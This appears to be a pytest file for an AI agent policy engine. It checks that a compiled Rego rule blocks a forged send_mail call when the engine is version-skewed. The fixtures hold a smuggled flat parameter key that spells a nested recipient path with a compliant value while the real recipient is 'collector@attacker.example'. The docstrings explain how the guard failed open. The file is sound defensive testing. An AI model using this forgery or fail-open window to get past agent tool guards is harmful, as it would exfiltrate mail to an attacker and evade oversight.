# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""`param_paths_ambiguous` is version-gated like every other new `input.derived` root.

The anti-forgery half of the `param_paths` guard READS a root the engine only started publishing
recently:

    not _in(object.get(input.derived, "param_paths_ambiguous", []), "<path>")

`object.get` with a `[]` default is a real value on ANY engine, so on one that does not publish the
root the membership test is over an empty list, `not _in([], path)` is TRUE, and the anti-forgery
conjunct evaporates while the derivability conjunct beside it still passes (`param_paths` IS
published). That is the fail-open window that the forged-path bypass lives in, open on exactly the
engines most likely to be behind on a rollout.

The existing coverage in `tests/engine/test_intent_compiler.py` exercises availability by removing a
root entirely, which removes `param_paths` too — so the SKEW case (an engine that publishes
`param_paths` and not `param_paths_ambiguous`) passed throughout. These tests pin that window.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

import pytest

from norviq.engine.intent import compile_intent

_OPA = shutil.which("opa")

# Verbatim from the audit: a recipient pin on a deeply nested path, and a call that ALSO carries a
# caller-minted flat key spelling that same path with a compliant value.
_INTENT = {
    "name": "mailer",
    "class": "support-bot",
    "call": [{
        "id": "notify",
        "match": {
            "tool_name": "send_mail",
            "param_paths.message.toRecipients[0].emailAddress.address": {"matches": r"^[^@]+@acme\.com$"},
        },
    }],
}

_FORGED_PATH = "message.toRecipients[0].emailAddress.address"


def _rego() -> str:
    return compile_intent(_INTENT).rego


def _eval(payload: dict, query: str = "decision") -> str:
    rego = _rego()
    package = re.search(r"(?m)^\s*package\s+([A-Za-z0-9_.]+)\s*$", rego).group(1)
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / "intent.rego"
        path.write_text(rego, encoding="utf-8")
        proc = subprocess.run(
            ["opa", "eval", "--v0-compatible", "-d", str(path), "-I", f"data.{package}.{query}"],
            input=json.dumps(payload), capture_output=True, text=True, check=True,
        )
        return json.loads(proc.stdout)["result"][0]["expressions"][0]["value"]


def _call(derived_extra: dict) -> dict:
    """The forged call, with `input.derived` assembled by the caller so a SKEWED engine is expressible."""
    base = {
        "verb": "send", "tool_kind": "other",
        "param_values": ["collector@attacker.example", "ops@acme.com"],
        "param_values_lower": ["collector@attacker.example", "ops@acme.com"],
        "sql_normalized": "", "sql_statements": [],
    }
    return {
        "tool_name": "send_mail", "direction": "call",
        "tool_params": {
            "message": {"toRecipients": [{"emailAddress": {"address": "collector@attacker.example"}}]},
            _FORGED_PATH: "ops@acme.com",
        },
        "agent": {"agent_class": "support-bot", "namespace": "agents"}, "call_depth": 0,
        "derived": {**base, **derived_extra},
    }


def test_the_ambiguity_root_is_stated_as_an_availability_requirement() -> None:
    """Reading a `param_paths` value commits the rule to BOTH roots, so both must be gated."""
    rego = _rego()
    assert 'object.get(input.derived, "param_paths", null) != null' in rego
    assert 'object.get(input.derived, "param_paths_ambiguous", null) != null' in rego, (
        "the anti-forgery half reads param_paths_ambiguous and would default it to [] on an older engine"
    )


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_a_forged_path_is_refused_on_an_engine_that_does_not_publish_the_ambiguity_list() -> None:
    """THE REGRESSION. `param_paths` present, `param_paths_ambiguous` absent — the version-skew window.

    Without the gate this returned decision="allow", rule_id="notify": the derivability conjunct
    passed (the path IS in param_paths, because the caller minted it) and the anti-forgery conjunct
    was vacuous. The tool then received `collector@attacker.example`.
    """
    skewed = _call({"param_paths": {
        _FORGED_PATH: "ops@acme.com",
        "message.toRecipients[0].emailAddress.address[0]": "collector@attacker.example",
    }})
    assert "param_paths_ambiguous" not in skewed["derived"], "the test's premise is the missing root"
    assert _eval(skewed) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_the_skew_denial_names_the_skew() -> None:
    """A version skew an operator cannot diagnose gets diagnosed as a broken policy and switched off."""
    skewed = _call({"param_paths": {_FORGED_PATH: "ops@acme.com"}})
    assert "param_paths_ambiguous is published by this engine" in _eval(skewed, "reason")


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_the_current_engine_still_refuses_the_forged_path() -> None:
    """The same call on a CURRENT engine: the path is named ambiguous and the rule must not match."""
    current = _call({
        "param_paths": {_FORGED_PATH: "ops@acme.com"},
        "param_paths_ambiguous": [_FORGED_PATH],
    })
    assert _eval(current) == "block"


@pytest.mark.skipif(_OPA is None, reason="opa binary required")
def test_an_honest_call_on_a_current_engine_is_still_allowed() -> None:
    """The cost side: gating a root must not deny the traffic the intent exists to admit."""
    honest = {
        "tool_name": "send_mail", "direction": "call",
        "tool_params": {"message": {"toRecipients": [{"emailAddress": {"address": "ops@acme.com"}}]}},
        "agent": {"agent_class": "support-bot", "namespace": "agents"}, "call_depth": 0,
        "derived": {
            "verb": "send", "tool_kind": "other", "param_values": ["ops@acme.com"],
            "param_values_lower": ["ops@acme.com"], "sql_normalized": "", "sql_statements": [],
            "param_paths": {_FORGED_PATH: "ops@acme.com"},
            "param_paths_ambiguous": [],
        },
    }
    assert _eval(honest) == "allow"
